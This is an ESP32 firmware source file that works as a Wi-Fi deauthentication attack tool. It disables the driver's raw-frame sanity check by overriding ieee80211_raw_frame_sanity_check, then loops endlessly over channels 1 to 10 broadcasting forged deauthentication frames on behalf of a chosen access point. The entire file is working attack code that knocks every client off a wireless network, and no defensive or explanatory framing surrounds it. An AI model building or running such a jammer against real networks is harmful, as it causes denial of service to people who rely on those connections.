extern "C" {
#include "freertos/FreeRTOS.h"

#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"

#include "nvs_flash.h"

#include "configure_wifi.h"
}

#include "packet.hpp"

PacketSender sender;

void spam_task(void *pvParameter) {
    const MacAddr TARGET = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };
    const MacAddr AP = {
        //replace with your AP's mac address
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

	while(1) {
        vTaskDelay(1000 / portTICK_PERIOD_MS);

        for(uint8_t ch = 1; ch < 11; ch++) {
            printf("Deauthing channel %d\n", ch);
            esp_err_t res;
            res = sender.deauth(TARGET, AP, AP, 1, ch);
            if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
        }
    }
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

extern "C" void app_main(void) {
    nvs_flash_init();
    tcpip_adapter_init();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Init dummy AP to specify a channel and get WiFi hardware into
    // a mode where we can send the actual fake beacon frames.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    ESP_ERROR_CHECK(esp32_deauther_configure_wifi(/* channel */ 1));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    xTaskCreate(&spam_task, "spam_task", 2048, NULL, 5, NULL);
}

